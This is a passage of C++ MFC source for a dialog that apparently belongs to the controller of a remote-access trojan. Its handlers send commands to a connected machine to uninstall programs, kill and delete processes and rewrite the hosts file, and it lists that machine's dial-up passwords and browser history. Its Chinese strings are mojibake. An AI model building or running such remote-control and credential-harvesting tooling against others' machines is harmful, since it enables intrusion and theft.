		lstrcpy(buffer, LPCSTR(Data));
		GlobalUnlock(clipbuffer);
		SetClipboardData(CF_TEXT, clipbuffer);
		CloseClipboard();
	}
}

void CSystemDlg::OnMenuitem40016()
{
	// TODO: Add your command handler code here

	CListCtrl* m_list;

	switch (m_tab.GetCurSel())
	{
	case 0:
		m_list = &m_list_systeminfo;
		break;
	case 3:
		m_list = &m_list_netstate;
		break;
	case 4:
		m_list = &m_list_software;
		break;
	case 5:
		m_list = &m_list_dialupass;
		break;
	case 6:
		m_list = &m_list_iehistory;
		break;
	case 7:
		m_list = &m_list_iefavorite;
		break;
	case 9:
		m_list = &m_list_net;
		break;
	case 10:
		m_list = &m_list_yingjian;
		break;
	case 11:
		m_list = &m_list_qidong;
		break;
	default:
		return;
	}

	if (m_list->GetSelectedCount() < 1)
	{
		return;
	}
	POSITION pos = m_list->GetFirstSelectedItemPosition();
	CString Data;
	CString temp;
	while (pos)
	{
		temp = "";
		int	nItem = m_list->GetNextSelectedItem(pos);
		for (int i = 0; i < m_list->GetHeaderCtrl()->GetItemCount(); i++)
		{
			temp += m_list->GetItemText(nItem, i);
			temp += "	";
		}
		Data += temp;
		Data += "\r\n";
	}
	SetClipboardText(Data);
	MessageBox("�Ѹ������ݵ����а�", NULL, MB_ICONINFORMATION);
}

void CSystemDlg::OnMenuitem40017()
{
	// TODO: Add your command handler code here
	if (m_list_software.GetSelectedCount() < 1)
	{
		return;
	}

	if (MessageBox(_T("ȷ��Ҫж�ظó���?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
		return;

	POSITION pos = m_list_software.GetFirstSelectedItemPosition();
	CString str;
	while (pos)
	{
		int	nItem = m_list_software.GetNextSelectedItem(pos);
		str = m_list_software.GetItemText(nItem, 4);

		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_APPUNINSTALL;
			memcpy(lpBuffer + 1, str.GetBuffer(0), str.GetLength());
			m_iocpServer->Send(m_pContext, lpBuffer, str.GetLength() + 1);
		}
	}
}

void CSystemDlg::OnMenuitem40018()
{
	// TODO: Add your command handler code here

	CListCtrl* m_list;

	switch (m_tab.GetCurSel())
	{
	case 3:
		m_list = &m_list_netstate;
		break;
	case 4:
		m_list = &m_list_software;
		break;
	case 6:
		m_list = &m_list_iehistory;
		break;
	case 7:
		m_list = &m_list_iefavorite;
		break;
	default:
		return;
	}

	CString str;
	int n = m_tab.GetCurSel();

	POSITION pos = m_list->GetFirstSelectedItemPosition();
	while (pos)
	{
		int	nItem = m_list->GetNextSelectedItem(pos);
		if (n == 6)
		{
			str = m_list->GetItemText(nItem, 3);
		}
		else if (n == 7)
		{
			str = m_list->GetItemText(nItem, 1);
		}
		else
			return;

		ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOWNORMAL);
	}
}

void CSystemDlg::OnMenuitem40019()
{
	// TODO: Add your command handler code here
	KillProcessDel(COMMAND_KILLPROCESS, "");  //��������
}

void CSystemDlg::OnMenuitem40020()
{
	// TODO: Add your command handler code here
	KillProcessDel(COMMAND_KILLPROCESS, "��ɾ��");  //������ɾ������
}

void CSystemDlg::PostNcDestroy()
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}

void CSystemDlg::OnBtnGethosts()
{
	// TODO: Add your control notification handler code here
	GetHostsInfo();
	GetDlgItem(IDC_BTN_SETHOSTS)->EnableWindow(FALSE);
}

void CSystemDlg::OnBtnSethosts()
{
	// TODO: Add your control notification handler code here
	LPBYTE lpBuffer = NULL;

	int nLength = m_edit_hosts.GetWindowTextLength();
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + nLength + 1);
	lpBuffer[0] = COMMAND_SETHOSTS;
	m_edit_hosts.GetWindowText((char*)(lpBuffer + 1), nLength + 1);
	m_iocpServer->Send(m_pContext, lpBuffer, 1 + nLength);
	LocalFree(lpBuffer);

	GetDlgItem(IDC_BTN_SETHOSTS)->EnableWindow(FALSE);
}

void CSystemDlg::OnChangeEdtHosts()
{
	// todo���������һ��RichEdit���ƣ����ƽ�����
//���ʹ�֪ͨ������������CDialog :: in init�Ի��򣨣�
//����������crich�༭ctrl�����������¼����루��
// eNM��exled ored ord ord ord��

	// TODO: Add your control notification handler code here
	GetDlgItem(IDC_BTN_SETHOSTS)->EnableWindow(TRUE);
}
